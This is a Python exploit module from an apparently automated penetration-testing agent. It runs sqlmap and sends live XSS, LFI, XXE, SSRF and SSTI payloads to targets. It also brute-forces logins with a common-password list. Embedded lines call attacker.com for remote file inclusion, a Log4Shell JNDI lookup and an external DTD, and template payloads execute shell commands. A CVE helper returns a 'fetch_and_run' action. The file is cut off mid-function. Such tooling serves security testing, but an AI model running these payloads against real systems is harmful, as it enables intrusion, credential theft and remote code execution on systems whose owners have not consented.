# modules/exploit.py
# DRAKBEN Exploit Module - STATE-AWARE Advanced
# REQUIRED: Exploit precondition model - will not run without conditions
# Enhanced: Logging, retry mechanism, better error handling

import asyncio
import logging
import subprocess
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

import aiohttp

# Setup logger
logger = logging.getLogger(__name__)

# from modules import ai_bridge
from core.tool_selector import ToolSelector

# State integration
try:
    from core.state import AgentState, AttackPhase

    STATE_AVAILABLE = True
except ImportError:
    STATE_AVAILABLE = False
    logger.warning("State module not available")


class ExploitError(Exception):
    """Custom exception for exploit errors"""
    pass


class RetryConfig:
    """Configuration for retry mechanism"""
    def __init__(self, max_retries: int = 3, base_delay: float = 1.0, max_delay: float = 30.0):
        self.max_retries = max_retries
        self.base_delay = base_delay
        self.max_delay = max_delay



# Constants
STATE_REQUIRED_MSG = "State is required for exploit execution"
BURPSUITE_TOOL = "manual/burpsuite"

def retry_on_failure(config: Optional[RetryConfig] = None):
    """
    Decorator for retry logic with exponential backoff.
    
    Args:
        config: RetryConfig instance
    """
    if config is None:
        config = RetryConfig()

    def decorator(func):
        def wrapper(*args, **kwargs):
            last_exception = None
            for attempt in range(config.max_retries):
                try:
                    return func(*args, **kwargs)
                except (subprocess.TimeoutExpired, ConnectionError, TimeoutError) as e:
                    last_exception = e
                    if attempt < config.max_retries - 1:
                        delay = min(config.base_delay * (2 ** attempt), config.max_delay)
                        logger.warning(f"Retry {attempt + 1}/{config.max_retries} for {func.__name__} after {delay}s: {e}")
                        time.sleep(delay)
            logger.error(f"{func.__name__} failed after {config.max_retries} retries")
            raise last_exception
        return wrapper
    return decorator


def check_exploit_preconditions(
    state: "AgentState", target: str, vuln_type: str
) -> Tuple[bool, str]:
    """
    Exploit precondition kontrolÃ¼ - ZORUNLU

    Returns:
        (can_exploit, reason)
    """
    logger.debug(f"Checking exploit preconditions for {vuln_type} on {target}")
    
    if not STATE_AVAILABLE or not state:
        logger.warning("State tracking not available")
        return False, STATE_REQUIRED_MSG

    # STATE VALIDATION
    if STATE_AVAILABLE and state:
        if not state.validate():
            logger.error("State invariant violation detected")
            return False, "State invariant violation"

    # Precondition 1: Target must be set
    if not state.target:
        logger.warning("No target set in state")
        return False, "No target set"

    # Precondition 2: Must be in EXPLOIT or later phase
    if state.phase not in [
        AttackPhase.EXPLOIT,
        AttackPhase.FOOTHOLD,
        AttackPhase.POST_EXPLOIT,
    ]:
        logger.warning(f"Wrong phase: {state.phase.value}, need EXPLOIT phase")
        return False, f"Wrong phase: {state.phase.value}, need EXPLOIT phase"

    # Precondition 3: Service must be open
    # Parse target for port
    if ":" in target:
        try:
            host, port_str = target.rsplit(":", 1)
            port = int(port_str)
            if port not in state.open_services:
                logger.warning(f"Port {port} is not open on target")
                return False, f"Port {port} is not open on target"
        except ValueError:
            pass

    # Precondition 4: Check if vulnerability exists in state
    if vuln_type and state.vulnerabilities:
        has_vuln = any(
            vuln_type.lower() in v.vuln_id.lower() for v in state.vulnerabilities
        )
        if not has_vuln:
            logger.warning(f"Vulnerability {vuln_type} not found in scan results")
            return False, f"Vulnerability {vuln_type} not found in scan results"

    logger.info(f"Preconditions satisfied for {vuln_type} exploit")
    return True, "Preconditions satisfied"


# -------------------------
# SQL Injection (sqlmap)
# -------------------------
@retry_on_failure(RetryConfig(max_retries=2, base_delay=2.0))
@retry_on_failure(RetryConfig(max_retries=2, base_delay=2.0))
def run_sqlmap(state: "AgentState", target: str, param: str = "id", level: str = "1") -> Dict[str, Any]:
    """
    STATE-AWARE SQLmap execution (ToolSelector enforced)
    """
    logger.info(f"Starting SQLmap scan: {target}?{param}=1 (level={level})")

    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    # 1. Validation Phase
    validation_result = _validate_sqlmap_request(state, target)
    if validation_result:
        return validation_result

    # 2. Execution Phase
    return _execute_and_process_sqlmap(target, param, level)

def _validate_sqlmap_request(state: "AgentState", target: str) -> Optional[Dict[str, Any]]:
    """Validate preconditions and tool capability"""
    can_run, reason = check_exploit_preconditions(state, target, "sqli")
    if not can_run:
        logger.warning(f"SQLmap precondition failed: {reason}")
        return {
            "type": "SQLi",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }

    selector = ToolSelector()
    valid, vreason = selector.validate_tool_selection("sqlmap_scan", state)
    if not valid:
        logger.error(f"Tool selection blocked: {vreason}")
        raise RuntimeError(f"Tool selection blocked: {vreason}")
        
    return None

def _execute_and_process_sqlmap(target: str, param: str, level: str) -> Dict[str, Any]:
    """Execute SQLMap and process results"""
    cmd = ["sqlmap", "-u", f"{target}?{param}=1", "--batch", f"--level={level}"]
    selector = ToolSelector()
    
    start_time = time.time()
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        duration = time.time() - start_time
        
        _handle_tool_status(selector, result.returncode)
        
        return _format_sqlmap_output(result, duration, target)

    except subprocess.TimeoutExpired:
        logger.error(f"SQLmap timeout after 120s on {target}")
        selector.record_tool_failure("sqlmap_scan")
        return {"type": "SQLi", "error": "SQLmap timeout", "timeout": True}
    except FileNotFoundError:
        logger.error("SQLmap not installed")
        return {"type": "SQLi", "error": "SQLmap not installed", "missing_tool": True}
    except Exception as e:
        logger.exception(f"SQLmap failed: {e}")
        return {"type": "SQLi", "error": str(e)}

def _handle_tool_status(selector: ToolSelector, exit_code: int):
    """Handle tool exit status"""
    if exit_code != 0:
        selector.record_tool_failure("sqlmap_scan")
        if selector.is_tool_blocked("sqlmap_scan"):
             raise RuntimeError("Tool sqlmap_scan blocked due to repeated failures")

def _format_sqlmap_output(result: subprocess.CompletedProcess, duration: float, target: str) -> Dict[str, Any]:
    """Format success output"""
    vulnerable = "is vulnerable" in result.stdout.lower() or "injectable" in result.stdout.lower()
    
    if vulnerable:
        logger.warning(f"SQL injection vulnerability found on {target}")

    return {
        "type": "SQLi",
        "stdout": result.stdout,
        "stderr": result.stderr,
        "exit_code": result.returncode,
        "vulnerable": vulnerable,
        "duration": duration,
    }


# -------------------------
# XSS Testi
# -------------------------
async def test_xss(
    state: "AgentState", 
    target: str, 
    param: str = "q",
    payloads: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    XSS vulnerability test with multiple payloads.
    
    Args:
        state: AgentState instance
        target: Target URL
        param: Parameter to test
        payloads: List of XSS payloads to test
        
    Returns:
        Dict with test results
    """
    logger.info(f"Starting XSS test on {target}, param={param}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "xss")
    if not can_run:
        logger.warning(f"XSS precondition failed: {reason}")
        return {
            "type": "XSS",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }
    
    if payloads is None:
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'><script>alert(1)</script>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
        ]
    
    results = []
    vulnerable_payloads = []
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for payload in payloads:
                try:
                    url = f"{target}?{param}={payload}"
                    async with session.get(url) as resp:
                        text = await resp.text()
                        reflected = payload in text
                        results.append({
                            "payload": payload,
                            "reflected": reflected,
                            "status": resp.status
                        })
                        if reflected:
                            vulnerable_payloads.append(payload)
                            logger.warning(f"XSS payload reflected: {payload[:30]}...")
                except Exception as e:
                    logger.debug(f"XSS test error with payload {payload[:20]}...: {e}")
                    results.append({"payload": payload, "error": str(e)})
        
        vulnerable = len(vulnerable_payloads) > 0
        if vulnerable:
            logger.warning(f"XSS vulnerability found with {len(vulnerable_payloads)} payloads")
        else:
            logger.info("No XSS vulnerability found")
            
        return {
            "type": "XSS",
            "vulnerable": vulnerable,
            "vulnerable_payloads": vulnerable_payloads,
            "results": results,
            "tested_count": len(payloads),
        }
        
    except Exception as e:
        logger.exception(f"XSS test failed: {e}")
        return {"type": "XSS", "error": str(e)}


# Constants for vulnerability indicators
INDICATOR_ROOT = "root:"
INDICATOR_DAEMON = "daemon:"
INDICATOR_EXTENSIONS = "[extensions]"

# -------------------------
# LFI Testi
# -------------------------
async def test_lfi(
    state: "AgentState", 
    target: str, 
    param: str = "file",
    payloads: Optional[List[str]] = None
) -> Dict[str, Any]:
    """
    LFI vulnerability test with multiple payloads.
    
    Args:
        state: AgentState instance
        target: Target URL
        param: Parameter to test
        payloads: List of LFI payloads to test
        
    Returns:
        Dict with test results
    """
    logger.info(f"Starting LFI test on {target}, param={param}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "lfi")
    if not can_run:
        logger.warning(f"LFI precondition failed: {reason}")
        return {
            "type": "LFI",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }
    
    if payloads is None:
        payloads = [
            "../../etc/passwd",
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....\\....\\....\\windows\\win.ini",
        ]
    
    # Indicators of successful LFI
    linux_indicators = [INDICATOR_ROOT, INDICATOR_DAEMON, "bin:", "sys:", "nobody:"]
    windows_indicators = [INDICATOR_EXTENSIONS, "[fonts]", "localhost"]
    
    results = []
    vulnerable_payloads = []
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=10)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for payload in payloads:
                try:
                    url = f"{target}?{param}={payload}"
                    async with session.get(url) as resp:
                        text = await resp.text()
                        
                        # Check for LFI indicators
                        found_linux = any(ind in text for ind in linux_indicators)
                        found_windows = any(ind in text for ind in windows_indicators)
                        vulnerable = found_linux or found_windows
                        
                        results.append({
                            "payload": payload,
                            "vulnerable": vulnerable,
                            "os_type": "linux" if found_linux else ("windows" if found_windows else None),
                            "status": resp.status
                        })
                        
                        if vulnerable:
                            vulnerable_payloads.append(payload)
                            os_type = "Linux" if found_linux else "Windows"
                            logger.warning(f"LFI vulnerability found ({os_type}): {payload}")
                            
                except Exception as e:
                    logger.debug(f"LFI test error with payload {payload}: {e}")
                    results.append({"payload": payload, "error": str(e)})
        
        if vulnerable_payloads:
            logger.warning(f"LFI vulnerability confirmed with {len(vulnerable_payloads)} payloads")
        else:
            logger.info("No LFI vulnerability found")
            
        return {
            "type": "LFI",
            "vulnerable": len(vulnerable_payloads) > 0,
            "vulnerable_payloads": vulnerable_payloads,
            "results": results,
            "tested_count": len(payloads),
        }
        
    except Exception as e:
        logger.exception(f"LFI test failed: {e}")
        return {"type": "LFI", "error": str(e)}


# -------------------------
# Basit Auth Bypass
# -------------------------
async def brute_force_login(
    state: "AgentState", 
    target: str, 
    username: str = "admin",
    passwords: Optional[List[str]] = None,
    rate_limit_delay: float = 0.5
) -> Dict[str, Any]:
    """
    Authentication brute force with rate limiting.
    
    Args:
        state: AgentState instance
        target: Login endpoint URL
        username: Username to test
        passwords: Password list
        rate_limit_delay: Delay between attempts (seconds)
        
    Returns:
        Dict with brute force results
    """
    logger.info(f"Starting brute force on {target}, username={username}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)

    can_run, reason = check_exploit_preconditions(state, target, "auth_bypass")
    if not can_run:
        logger.warning(f"Brute force precondition failed: {reason}")
        return {
            "type": "AuthBypass",
            "error": f"Precondition failed: {reason}",
            "blocked": True,
        }
    
    if passwords is None:
        passwords = [
            "admin", "123456", "password", "root", "toor",
            "admin123", "password123", "12345678", "qwerty",
            "letmein", "welcome", "admin@123"
        ]
    
    # Success indicators
    success_indicators = ["dashboard", "welcome", "logout", "profile", "home"]
    failure_indicators = ["invalid", "incorrect", "failed", "wrong", "error"]
    
    attempts = []
    
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for pwd in passwords:
                try:
                    # Rate limiting
                    await asyncio.sleep(rate_limit_delay)
                    
                    data = {"username": username, "password": pwd}
                    async with session.post(target, data=data, allow_redirects=False) as resp:
                        text = await resp.text()
                        text_lower = text.lower()
                        
                        # Check for success
                        is_redirect = resp.status in [301, 302, 303, 307, 308]
                        has_success_indicator = any(ind in text_lower for ind in success_indicators)
                        has_failure_indicator = any(ind in text_lower for ind in failure_indicators)
                        
                        success = (is_redirect or has_success_indicator) and not has_failure_indicator
                        
                        attempts.append({
                            "password": pwd,
                            "status": resp.status,
                            "success": success
                        })
                        
                        if success:
                            logger.warning(f"Successful login found: {username}:{pwd}")
                            return {
                                "type": "AuthBypass",
                                "success": True,
                                "username": username,
                                "password": pwd,
                                "attempts": len(attempts),
                            }
                            
                except Exception as e:
                    logger.debug(f"Brute force attempt error with password {pwd}: {e}")
                    attempts.append({"password": pwd, "error": str(e)})
        
        logger.info(f"Brute force completed: no valid credentials found in {len(attempts)} attempts")
        return {
            "type": "AuthBypass",
            "success": False,
            "attempts": len(attempts),
            "tested_passwords": len(passwords),
        }
        
    except Exception as e:
        logger.exception(f"Brute force failed: {e}")
        return {"type": "AuthBypass", "error": str(e)}


# -------------------------
# AI-Powered Recommendation
# -------------------------
async def ai_exploit_advice(state: "AgentState", recon_output: Dict) -> Dict[str, Any]:
    """
    AI-powered exploit recommendation.
    
    Args:
        state: AgentState instance
        recon_output: Output from recon module
        
    Returns:
        Dict with AI recommendations
    """
    logger.info("Starting AI exploit advice engine")
    
    if state is None:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}
    
    if not STATE_AVAILABLE or not state:
        return {"type": "AI", "error": "State tracking is required", "blocked": True}
    
    if not state.validate():
        logger.error("State invariant violation in AI advice")
        return {
            "type": "AI",
            "error": "State invariant violation",
            "blocked": True,
            "invariant_violations": getattr(state, "invariant_violations", []),
        }
    
    # CORE REFACTOR: ai_bridge removed. Use Brain directly.
    await asyncio.sleep(0)  # Keep function async for compatibility
    advice = "AI Bridge deprecated. Use brain.think() instead."
    return {"type": "AI", "advice": advice}


# -------------------------
# Suggest Exploit (Helper)
# -------------------------
def suggest_exploit(vulnerability_type: str, target: Optional[str] = None) -> Dict[str, Any]:
    """
    Suggest appropriate exploit based on vulnerability type.

    Args:
        vulnerability_type: Type of vulnerability (sqli, xss, lfi, auth_bypass)
        target: Optional target URL

    Returns:
        dict with exploit suggestions
    """
    logger.debug(f"Suggesting exploit for vulnerability type: {vulnerability_type}")
    
    suggestions = {
        "sqli": {
            "tool": "sqlmap",
            "command": (
                f"sqlmap -u {target} --batch"
                if target
                else "sqlmap -u <target> --batch"
            ),
            "description": "SQL Injection automated exploitation",
            "severity": "high",
            "payloads": ["' OR '1'='1", "' UNION SELECT NULL--", "1; DROP TABLE users--"],
        },
        "xss": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg/onload=alert(1)>",
                "javascript:alert(document.cookie)",
            ],
            "description": "Cross-Site Scripting test payloads",
            "severity": "medium",
        },
        "lfi": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "php://filter/convert.base64-encode/resource=index.php",
                "/proc/self/environ",
            ],
            "description": "Local File Inclusion test paths",
            "severity": "high",
        },
        "rfi": {
            "tool": "manual",
            "payloads": [
                "http://attacker.com/shell.txt",
                "https://raw.githubusercontent.com/.../shell.php",
            ],
            "description": "Remote File Inclusion test URLs",
            "severity": "critical",
        },
        "auth_bypass": {
            "tool": "hydra",
            "command": (
                f"hydra -L users.txt -P pass.txt {target} http-post-form"
                if target
                else "hydra -L users.txt -P pass.txt <target> http-post-form"
            ),
            "description": "Authentication brute force",
            "severity": "high",
        },
        "ssrf": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                "http://localhost:80",
                "http://127.0.0.1:22",
                "http://169.254.169.254/latest/meta-data/",
                "file:///etc/passwd",
            ],
            "description": "Server-Side Request Forgery test payloads",
            "severity": "high",
        },
        "xxe": {
            "tool": BURPSUITE_TOOL,
            "payloads": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            "description": "XML External Entity test payloads",
            "severity": "high",
        },
    }

    # ... (existing suggestions code) ...
    vuln_lower = vulnerability_type.lower()
    
    # NEW: Dynamic CVE Exploit Lookup
    # If the vulnerability looks like a CVE (e.g., CVE-2024-1234), try to fetch it.
    if vuln_lower.startswith("cve-"):
        logger.info(f"CVE detected: {vuln_lower}. Attempting to fetch known exploits...")
        return {
            "tool": "exploit_fetcher",
            "cve_id": vuln_lower.upper(),
            "description": f"Auto-fetch exploit for {vuln_lower.upper()}",
            "severity": "critical",
            "action": "fetch_and_run"
        }

    if vuln_lower in suggestions:
        logger.info(f"Found exploit suggestion for {vuln_lower}")
        return suggestions[vuln_lower]
    
    logger.warning(f"Unknown vulnerability type: {vulnerability_type}")
    return {
        "error": f"Unknown vulnerability type: {vulnerability_type}",
        "available": list(suggestions.keys()),
    }

async def fetch_and_prepare_exploit(state: "AgentState", cve_id: str) -> Dict[str, Any]:
    """
    Dynamically fetch exploit code for a given CVE from public repositories.
    (Simulated for safety - in real world would query ExploitDB/GitHub API)
    """
    logger.info(f"Searching for exploit: {cve_id}")
    
    if state is None:
         return {"success": False, "error": "State required"}

    # Mocking the search process (Real implementation would use requests to GitHub API)
    # For now, we simulate finding a Python script for the CVE
    
    found_exploit = False
    exploit_code = ""
    
    # Simulator: Known CVEs
    known_cves = {
        "CVE-2021-44228": {
            "name": "Log4Shell",
            "code": "# Log4Shell PoC\nimport requests\ndef exploit(target):\n    payload = '${jndi:ldap://attacker.com/a}'\n    requests.get(target, headers={'User-Agent': payload})",
            "lang": "python"
        },
        "CVE-2017-0144": {
             "name": "EternalBlue",
             "code": "# EternalBlue SMB Exploit wrapper\n# ... binary payload ...",
             "lang": "python"
        }
    }
    
    if cve_id in known_cves:
        found_exploit = True
        data = known_cves[cve_id]
        exploit_code = data["code"]
        logger.info(f"Exploit found for {cve_id} ({data['name']})")
    else:
        # Fallback: Ask LLM if it knows a PoC for this CVE
        # In a real scenario, this would be a search_web tool call
        logger.warning(f"No local exploit found for {cve_id}. Enabling AI search mode.")
        return {
            "success": False, 
            "error": "Exploit not in local database. AI Search required.",
            "cve_id": cve_id,
            "recommendation": "Use search_web tool to find PoC"
        }

    if found_exploit:
        # Save to temp file
        filename = f"modules/dynamic_exploits/{cve_id}.py"
        import os
        import aiofiles  # Ensure aiofiles is imported/available
        
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        
        async with aiofiles.open(filename, "w") as f:
            await f.write(exploit_code)
            
        return {
            "success": True,
            "exploit_file": filename,
            "language": data["lang"],
            "description": data["name"]
        }
    
    return {"success": False, "error": "No exploit found"}


# -------------------------
# XXE (XML External Entity)
# -------------------------
async def test_xxe(
    state: "AgentState",
    target_url: str,
    parameter: str = "xml",
    timeout: int = 30
) -> Dict[str, Any]:
    """
    Test for XXE (XML External Entity) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL accepting XML input
        parameter: XML parameter name
        timeout: Request timeout
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing XXE on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    # Precondition check
    can_exploit, reason = check_exploit_preconditions(state, target_url, "xxe")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # XXE Payloads
    xxe_payloads = [
        # Basic file read
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        # Windows file read
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><data>&xxe;</data>',
        # Parameter entity
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><data>test</data>',
        # CDATA exfiltration
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><data>&xxe;</data>',
        # Error-based
        '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent">]><data>&xxe;</data>',
    ]
    
    results = []
    vulnerable = False
    
    async with aiohttp.ClientSession() as session:
        for payload in xxe_payloads:
            try:
                headers = {"Content-Type": "application/xml"}
                async with session.post(
                    target_url,
                    data=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    response_text = await resp.text()
                    
                    # Check for indicators
                    indicators = [INDICATOR_ROOT, INDICATOR_DAEMON, INDICATOR_EXTENSIONS, "for 16-bit app support"]
                    for indicator in indicators:
                        if indicator in response_text:
                            vulnerable = True
                            results.append({
                                "payload": payload[:100] + "...",
                                "indicator": indicator,
                                "vulnerable": True
                            })
                            break
                    
            except Exception as e:
                logger.debug(f"XXE test error: {e}")
    
    if vulnerable:
        logger.warning(f"XXE vulnerability found on {target_url}")
        # Update state
        from core.state import VulnerabilityInfo
        parsed_url = urlparse(target_url)
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        service = parsed_url.scheme or "http"
        state.add_vulnerability(VulnerabilityInfo(
            vuln_id="XXE",
            service=service,
            port=port,
            severity="high",
            exploitable=True
        ))
    
    return {
        "type": "XXE",
        "target": target_url,
        "vulnerable": vulnerable,
        "results": results
    }


# -------------------------
# SSRF (Server-Side Request Forgery)
# -------------------------
async def test_ssrf(
    state: "AgentState",
    target_url: str,
    parameter: str = "url",
    timeout: int = 30
) -> Dict[str, Any]:
    """
    Test for SSRF (Server-Side Request Forgery) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL with URL parameter
        parameter: Parameter name accepting URLs
        timeout: Request timeout
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing SSRF on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "ssrf")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # SSRF Payloads
    ssrf_payloads = [
        # Localhost variants
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://127.1/",
        "http://0177.0.0.1/",  # Octal
        "http://2130706433/",  # Decimal
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance",  # Azure
        # Internal services
        "http://localhost:22/",
        "http://localhost:3306/",
        "http://localhost:6379/",
        "http://localhost:27017/",
        # File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        # Gopher
        "gopher://localhost:6379/_INFO",
        # Dict
        "dict://localhost:6379/info",
    ]
    
    results = []
    vulnerable = False
    
    async with aiohttp.ClientSession() as session:
        for payload in ssrf_payloads:
            try:
                # Try both GET and POST
                test_url = f"{target_url}?{parameter}={payload}"
                
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=timeout),
                    allow_redirects=False
                ) as resp:
                    response_text = await resp.text()
                    
                    # Check for indicators
                    indicators = [
                        "root:", "daemon:",  # /etc/passwd
                        "[extensions]",  # win.ini
                        "ami-id", "instance-id",  # AWS metadata
                        "redis_version",  # Redis
                        "SSH-",  # SSH banner
                    ]
                    
                    for indicator in indicators:
                        if indicator.lower() in response_text.lower():
                            vulnerable = True
                            results.append({
                                "payload": payload,
                                "indicator": indicator,
                                "vulnerable": True
                            })
                            break
                    
            except Exception as e:
                logger.debug(f"SSRF test error: {e}")
    
    if vulnerable:
        logger.warning(f"SSRF vulnerability found on {target_url}")
        from core.state import VulnerabilityInfo
        parsed_url = urlparse(target_url)
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        service = parsed_url.scheme or "http"
        state.add_vulnerability(VulnerabilityInfo(
            vuln_id="SSRF",
            service=service,
            port=port,
            severity="high",
            exploitable=True
        ))
    
    return {
        "type": "SSRF",
        "target": target_url,
        "vulnerable": vulnerable,
        "results": results
    }


# -------------------------
# SSTI (Server-Side Template Injection)
# -------------------------
async def test_ssti(
    state: "AgentState",
    target_url: str,
    parameter: str = "name",
    timeout: int = 30
) -> Dict[str, Any]:
    """
    Test for SSTI (Server-Side Template Injection) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL
        parameter: Parameter to test
        timeout: Request timeout
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing SSTI on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "ssti")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # SSTI Payloads with expected results
    ssti_payloads = [
        # Math operations (universal)
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%= 7*7 %>", "49"),
        ("#{7*7}", "49"),
        ("${{7*7}}", "49"),
        # Jinja2 (Python)
        ("{{config}}", "SECRET_KEY"),
        ("{{''.__class__.__mro__[2].__subclasses__()}}", "__subclasses__"),
        # Twig (PHP)
        ("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "uid="),
        # Freemarker (Java)
        ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid="),
        # Velocity (Java)
        ("#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end", "uid="),
        # Smarty (PHP)
        ("{php}echo `id`;{/php}", "uid="),
        # Mako (Python)
        ("<%import os%>${os.popen('id').read()}", "uid="),
        # Pebble (Java)
        ("{% set cmd = 'id' %}{% set out = beans['java.lang.Runtime'].getRuntime().exec(cmd).getInputStream() %}{{ out }}", "java"),
    ]
    
    results = []
    vulnerable = False
    detected_engine = None
    
    async with aiohttp.ClientSession() as session:
        for payload, expected in ssti_payloads:
            try:
                # URL encode payload
                from urllib.parse import quote
                encoded_payload = quote(payload)
                test_url = f"{target_url}?{parameter}={encoded_payload}"
                
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    response_text = await resp.text()
                    
                    if expected in response_text:
                        vulnerable = True
                        
                        # Detect template engine
                        if "{{" in payload and "config" in payload:
                            detected_engine = "Jinja2"
                        elif "${" in payload:
                            detected_engine = "Freemarker/Velocity"
                        elif "{php}" in payload:
                            detected_engine = "Smarty"
                        elif "<%" in payload:
                            detected_engine = "Mako/ERB"
                        else:
                            detected_engine = "Unknown"
                        
                        results.append({
                            "payload": payload,
                            "expected": expected,
                            "engine": detected_engine,
                            "vulnerable": True
                        })
                        break
                    
            except Exception as e:
                logger.debug(f"SSTI test error: {e}")
    
    if vulnerable:
        logger.warning(f"SSTI vulnerability found on {target_url} (Engine: {detected_engine})")
        from core.state import VulnerabilityInfo
        parsed_url = urlparse(target_url)
        port = parsed_url.port or (443 if parsed_url.scheme == "https" else 80)
        service = parsed_url.scheme or "http"
        state.add_vulnerability(VulnerabilityInfo(
            vuln_id="SSTI",
            service=service,
            port=port,
            severity="critical",
            exploitable=True
        ))
    
    return {
        "type": "SSTI",
        "target": target_url,
        "vulnerable": vulnerable,
        "template_engine": detected_engine,
        "results": results
    }


# -------------------------
# IDOR (Insecure Direct Object Reference)
# -------------------------
async def test_idor(
    state: "AgentState",
    target_url: str,
    parameter: str = "id",
    known_id: int = 1,
    test_ids: List[int] = None,
    timeout: int = 30
) -> Dict[str, Any]:
    """
    Test for IDOR (Insecure Direct Object Reference) vulnerability.
    
    Args:
        state: AgentState instance
        target_url: Target URL with object reference
        parameter: Parameter name containing the ID
        known_id: A known valid ID for baseline
        test_ids: List of IDs to test
        timeout: Request timeout
        
    Returns:
        Dict with test results
    """
    logger.info(f"Testing IDOR on {target_url}")
    
    if state is None:
        raise RuntimeError(STATE_REQUIRED_MSG)
    
    can_exploit, reason = check_exploit_preconditions(state, target_url, "idor")
    if not can_exploit:
        return {"success": False, "error": reason, "blocked": True}
    
    # Default test IDs
    if test_ids is None:
        test_ids = [0, 1, 2, known_id - 1, known_id + 1, 100, 1000, 9999]
    
    results = []
    vulnerable = False
    accessible_ids = []
    
    async with aiohttp.ClientSession() as session:
        # Get baseline response
        baseline_url = f"{target_url}?{parameter}={known_id}"
        try:
            async with session.get(
                baseline_url,
                timeout=aiohttp.ClientTimeout(total=timeout)
            ) as resp:
                baseline_status = resp.status
                baseline_length = len(await resp.text())
        except Exception as e:
            logger.error(f"Baseline request failed: {e}")
            return {"success": False, "error": str(e)}
        
        # Test each ID
        for test_id in test_ids:
            if test_id == known_id:
                continue
            
            try:
                test_url = f"{target_url}?{parameter}={test_id}"
                
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=timeout)
                ) as resp:
                    status = resp.status
                    response_text = await resp.text()
                    response_length = len(response_text)
                    
                    # Check for successful access
                    if status == 200:
                        # Compare with baseline
                        length_diff = abs(response_length - baseline_length)
                        
                        # If response is similar to baseline, might be IDOR
                        if length_diff < baseline_length * 0.5 and response_length > 100:
                            # Check for sensitive data patterns
                            sensitive_patterns = [
                                r'"email":\s*"[^"]+@[^"]+"',
                                r'"password"',
                                r'"ssn"',
                                r'"credit_card"',
                                r'"phone":\s*"[0-9]+"',
